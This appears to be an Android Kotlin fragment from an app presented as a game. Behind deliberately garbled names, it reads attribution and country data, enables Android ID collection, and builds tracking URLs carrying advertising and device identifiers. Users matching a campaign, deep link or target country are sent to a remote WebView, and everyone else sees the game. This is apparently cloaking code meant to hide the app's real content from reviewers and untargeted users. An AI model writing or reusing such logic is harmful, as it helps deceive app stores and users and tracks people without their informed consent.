package com.artifexmundi.bal.fffragg

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.artifexmundi.bal.R
import com.artifexmundi.bal.gaaamee.GaaimimiActivity
import com.artifexmundi.bal.otther.Utilgtgtgt.hyjoyhjiiyh
import com.artifexmundi.bal.otther.Utilgtgtgt.ad_id
import com.artifexmundi.bal.otther.Utilgtgtgt.appsfrfrrfrf
import com.artifexmundi.bal.otther.Utilgtgtgt.aps_idgtgt
import com.artifexmundi.bal.otther.Utilgtgtgt.codeCode
import com.artifexmundi.bal.otther.Utilgtgtgt.geoCoggt
import com.artifexmundi.bal.otther.Utilgtgtgt.instIdgtgtg
import com.artifexmundi.bal.otther.Utilgtgtgt.keyVAlgtgttg
import com.artifexmundi.bal.otther.Utilgtgtgt.linkaagttgtg
import com.artifexmundi.bal.otther.Utilgtgtgt.hyhyhyhy
import com.artifexmundi.bal.otther.Utilgtgtgt.namm
import com.artifexmundi.bal.otther.Utilgtgtgt.onegttg
import com.artifexmundi.bal.otther.Utilgtgtgt.subFive56565
import com.artifexmundi.bal.otther.Utilgtgtgt.subFourgt
import com.artifexmundi.bal.otther.Utilgtgtgt.subOneggtgt
import com.artifexmundi.bal.otther.Utilgtgtgt.subSixgttgg
import com.artifexmundi.bal.otther.Utilgtgtgt.trololo
import com.artifexmundi.bal.otther.Utilgtgtgt.urlMainghyyh
import com.artifexmundi.bal.vieevmod.VebbbbActivity
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FilllFragment : Fragment() {


    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_filll, container, false)
    }

    private lateinit var hjuujujujuj: Context
    val sharePgttg: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        hjuujujujuj = context
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {

        val intentBeamgtgtgt = Intent(activity, VebbbbActivity::class.java)
        val intentGamegtgtgt = Intent(activity, GaaimimiActivity::class.java)

        super.onViewCreated(view, savedInstanceState)
        val counthyyhhy = sharePgttg.getString(geoCoggt, null)

        val appssss = sharePgttg.getString(appsfrfrrfrf, null)
        val wvgtgtgt = sharePgttg.getString(urlMainghyyh, null)
        val mainIdgtgtgt = sharePgttg.getString("mainId", null)
        val appCamphyhyhy = sharePgttg.getString("appCamp", null)
        val deepSthyhyhy = sharePgttg.getString("deepSt", null)
        val countryDevaaa = sharePgttg.getString(codeCode, null)
        val packgttggt = hyjoyhjiiyh
        val buildVersgtgtgt = Build.VERSION.RELEASE
        val myTrIdgtgtgtgt = sharePgttg.getString(hyhyhyhy, null)
        val myInstIdgtgtgt: String? = sharePgttg.getString(instIdgtgtg, null)

        Log.d("lolo", "countryDev $countryDevaaa")
        Log.d("lolo", "count $counthyyhhy")
        Log.d("lolo", "count $appssss")



        val hhyhyhy = AppsFlyerLib.getInstance().getAppsFlyerUID(hjuujujujuj)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        sharePgttg.edit().putString(aps_idgtgt, hhyhyhy).apply()

        val linkAppsgtgtgt = "$wvgtgtgt$subOneggtgt$appCamphyhyhy&$onegttg$hhyhyhy&$ad_id$mainIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$namm"
        val linkMTgtgtgt = "$wvgtgtgt$onegttg$myTrIdgtgtgtgt&$ad_id$myInstIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$namm"
        val linkFBgtgttg = "$wvgtgtgt$subOneggtgt$deepSthyhyhy&$onegttg$hhyhyhy&$ad_id$mainIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$trololo"
        val linkFBNullAppsgtgt = "$wvgtgtgt$subOneggtgt$deepSthyhyhy&$onegttg$myTrIdgtgtgtgt&$ad_id$myInstIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$trololo"

        when(appssss) {
            "1" ->
                if(appCamphyhyhy!!.contains(keyVAlgtgttg)) {
                    sharePgttg.edit().putString(linkaagttgtg, linkAppsgtgtgt).apply()
                    sharePgttg.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeamgtgtgt)
                    activity?.finish()
                } else if (deepSthyhyhy!=null||countryDevaaa!!.contains(counthyyhhy.toString())) {
                    sharePgttg.edit().putString(linkaagttgtg, linkFBgtgttg).apply()
                    sharePgttg.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeamgtgtgt)
                    activity?.finish()
                } else {
                    startActivity(intentGamegtgtgt)
                    activity?.finish()
                }
            "0" ->
                if(deepSthyhyhy!=null) {
                    sharePgttg.edit().putString(linkaagttgtg, linkFBNullAppsgtgt).apply()
                    sharePgttg.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeamgtgtgt)
                    activity?.finish()
                } else if (countryDevaaa!!.contains(counthyyhhy.toString())) {
                    sharePgttg.edit().putString(linkaagttgtg, linkMTgtgtgt).apply()
                    sharePgttg.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeamgtgtgt)
                    activity?.finish()
                } else {
                    startActivity(intentGamegtgtgt)
                    activity?.finish()
                }
        }
    }
}
